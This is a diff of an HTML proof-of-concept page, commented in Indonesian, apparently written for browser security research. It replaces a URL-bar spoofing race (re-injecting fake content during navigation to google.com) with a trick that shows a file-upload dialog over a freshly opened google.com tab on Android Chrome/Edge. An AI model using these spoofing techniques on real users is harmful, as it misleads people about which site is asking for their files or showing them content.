@@ -1,59 +1,36 @@
 <!DOCTYPE html>
-<html lang="en">
-<head>
-    <title>PoC: Advanced Race Condition</title>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width,initial-scale=1">
-</head>
-<body>
-    <h1>Security Test</h1>
-    <button id="pocBtn" style="padding: 20px;">Execute Advanced Bypass</button>
-
-    <script>
-        const fakeContent = `
-            <html>
-            <body style="background:white; color:red; text-align:center; padding-top:50px; font-family:sans-serif;">
-                <h1>SPOOFED CONTENT</h1>
-                <p>URL Bar harusnya menunjukkan google.com</p>
-                <script>
-                    // Mengunci halaman agar tidak lanjut loading
-                    window.stop(); 
-                <\/script>
-            </body>
-            </html>
-        `;
-
-        document.getElementById('pocBtn').onclick = () => {
-            // 1. Buka window dengan about:blank terlebih dahulu
-            let win = window.open("about:blank", "PoC_Window");
-
-            // 2. Tulis konten ke about:blank (masih satu origin dengan kita)
-            win.document.write(fakeContent);
-
-            // 3. Picu navigasi ke Google
-            // Browser akan mulai mengganti URL bar, tapi kita akan mencoba
-            // menginterupsi proses commit document-nya.
-            setTimeout(() => {
-                win.location.href = "https://www.google.com";
+<html lang="id">
+    <head>
+        <title>PoC Upload Dialog</title>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"/>
+        <style>
+            body { font-family: sans-serif; cursor: pointer; height: 100vh; display: flex; align-items: center; justify-content: center; }
+            #fileInput { display: none; }
+        </style>
+        <script>
+            onclick = () => {
+                // Memicu dialog pemilihan file
+                document.getElementById('fileInput').click();
                 
-                // 4. THE ATTACK: Re-inject content saat transisi
-                // Kita gunakan loop super cepat (Microtasks)
-                let attempts = 0;
-                function race() {
-                    try {
-                        // Selama navigasi 'pending', kita mungkin masih punya akses
-                        win.document.documentElement.innerHTML = fakeContent;
-                        if (attempts < 500) {
-                            attempts++;
-                            requestAnimationFrame(race);
-                        }
-                    } catch (e) {
-                        // Jika gagal (Access Denied), berarti Google sudah commit
-                    }
-                }
-                race();
-            }, 500);
-        };
-    </script>
-</body>
+                // Segera membuka tab baru ke google.com
+                // Di Android (Edge/Chrome), dialog file seringkali tetap menggantung 
+                // di atas aplikasi meskipun tab di belakangnya sudah berubah.
+                window.open("https://www.google.com", "PoC");
+
+                // Logika tambahan untuk mendeteksi file yang dipilih (opsional)
+                document.getElementById('fileInput').onchange = (e) => {
+                    const fileName = e.target.files.name;
+                    document.body.innerHTML = `<h1>File terdeteksi: <span style="color:red">${fileName}</span></h1>`;
+                };
+            }
+        </script>
+    </head>  
+    <body>
+        <input type="file" id="fileInput">
+        <center>
+            <h1>Klik di mana saja untuk memicu dialog File Upload di atas Google.com</h1>
+            <p>(Uji coba khusus Edge/Chrome di Android)</p>
+        </center>
+    </body>
 </html>
